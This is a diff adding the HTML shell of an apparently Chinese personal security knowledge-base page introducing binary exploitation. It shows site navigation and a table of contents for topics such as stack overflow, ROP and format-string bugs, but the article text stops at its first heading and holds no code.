@@ -1,0 +1,1724 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="F1rstb100d个人知识库，努力做一个全栈H4cker">
+      
+      
+        <meta name="author" content="F1rstb100d">
+      
+      
+        <link rel="canonical" href="https://f1rstb100d.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/">
+      
+      <link rel="icon" href="../../assets/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.5.10">
+    
+    
+      
+        <title>PWN入门 - F1rstb100d知识库</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.472b142f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.08040f6c.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#4051b5">
+        
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#pwn" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="F1rstb100d知识库" class="md-header__button md-logo" aria-label="F1rstb100d知识库" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            F1rstb100d知识库
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              PWN入门
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/f1rstb100d/f1rstb100d.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    f1rstb100d.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../.." class="md-tabs__link">
+      知识库结构
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8/" class="md-tabs__link">
+        Web安全
+      </a>
+    </li>
+  
+
+  
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="./" class="md-tabs__link md-tabs__link--active">
+        二进制安全
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/" class="md-tabs__link">
+        内网安全
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/" class="md-tabs__link">
+        环境配置
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="F1rstb100d知识库" class="md-nav__button md-logo" aria-label="F1rstb100d知识库" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    F1rstb100d知识库
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/f1rstb100d/f1rstb100d.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    f1rstb100d.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        知识库结构
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Web安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Web安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_1">
+          SQL注入
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SQL注入" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          SQL注入
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8/" class="md-nav__link">
+        sqlmap使用
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        SQL注入
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_2">
+          XXE
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XXE" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          XXE
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        XXE漏洞
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_3" type="checkbox" id="__nav_2_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_3">
+          反序列化
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="反序列化" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_3">
+          <span class="md-nav__icon md-icon"></span>
+          反序列化
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        Java反序列化
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        PHP反序列化
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        Python反序列化
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_4" type="checkbox" id="__nav_2_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_4">
+          文件上传
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="文件上传" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_4">
+          <span class="md-nav__icon md-icon"></span>
+          文件上传
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        文件上传总结
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          二进制安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="二进制安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          二进制安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          PWN入门
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        PWN入门
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    介绍
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    二进制格式
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    函数调用传参
+  </a>
+  
+    <nav class="md-nav" aria-label="函数调用传参">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#x64" class="md-nav__link">
+    X64
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#x86" class="md-nav__link">
+    X86
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    栈格式
+  </a>
+  
+    <nav class="md-nav" aria-label="栈格式">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    函数调用
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    函数返回
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    栈溢出
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#return-to-text" class="md-nav__link">
+    Return to Text
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#return-to-shellcode" class="md-nav__link">
+    Return to Shellcode
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    栈保护方法
+  </a>
+  
+    <nav class="md-nav" aria-label="栈保护方法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#canary" class="md-nav__link">
+    Canary
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nx" class="md-nav__link">
+    NX
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#aslr" class="md-nav__link">
+    ASLR
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pie" class="md-nav__link">
+    PIE
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#relro" class="md-nav__link">
+    RELRO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#got-hijack" class="md-nav__link">
+    GOT Hijack
+  </a>
+  
+    <nav class="md-nav" aria-label="GOT Hijack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lazy-binding" class="md-nav__link">
+    Lazy Binding 懒加载
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rop" class="md-nav__link">
+    ROP
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#return-to-plt" class="md-nav__link">
+    Return to PLT
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#return-to-libc" class="md-nav__link">
+    Return to libc
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    格式化字符串漏洞
+  </a>
+  
+    <nav class="md-nav" aria-label="格式化字符串漏洞">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    常见函数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    漏洞原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    泄露内存
+  </a>
+  
+    <nav class="md-nav" aria-label="泄露内存">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    泄露栈内内存
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    泄露任意内存
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    覆盖内存
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          内网安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="内网安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          内网安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/" class="md-nav__link">
+        PTH传递攻击
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5">
+          环境配置
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="环境配置" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          环境配置
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/" class="md-nav__link">
+        Git入门
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    介绍
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    二进制格式
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    函数调用传参
+  </a>
+  
+    <nav class="md-nav" aria-label="函数调用传参">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#x64" class="md-nav__link">
+    X64
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#x86" class="md-nav__link">
+    X86
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    栈格式
+  </a>
+  
+    <nav class="md-nav" aria-label="栈格式">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    函数调用
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    函数返回
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    栈溢出
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#return-to-text" class="md-nav__link">
+    Return to Text
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#return-to-shellcode" class="md-nav__link">
+    Return to Shellcode
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    栈保护方法
+  </a>
+  
+    <nav class="md-nav" aria-label="栈保护方法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#canary" class="md-nav__link">
+    Canary
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nx" class="md-nav__link">
+    NX
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#aslr" class="md-nav__link">
+    ASLR
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pie" class="md-nav__link">
+    PIE
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#relro" class="md-nav__link">
+    RELRO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#got-hijack" class="md-nav__link">
+    GOT Hijack
+  </a>
+  
+    <nav class="md-nav" aria-label="GOT Hijack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lazy-binding" class="md-nav__link">
+    Lazy Binding 懒加载
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rop" class="md-nav__link">
+    ROP
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#return-to-plt" class="md-nav__link">
+    Return to PLT
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#return-to-libc" class="md-nav__link">
+    Return to libc
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    格式化字符串漏洞
+  </a>
+  
+    <nav class="md-nav" aria-label="格式化字符串漏洞">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    常见函数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    漏洞原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    泄露内存
+  </a>
+  
+    <nav class="md-nav" aria-label="泄露内存">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    泄露栈内内存
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    泄露任意内存
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    覆盖内存
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <a href="https://github.com/f1rstb100d/f1rstb100d.github.io/edit/master/docs/二进制安全/PWN入门.md" title="编辑此页" class="md-content__button md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+<h1 id="pwn">PWN入门<a class="headerlink" href="#pwn" title="Permanent link">&para;</a></h1>
+<h2 id="_1">介绍<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
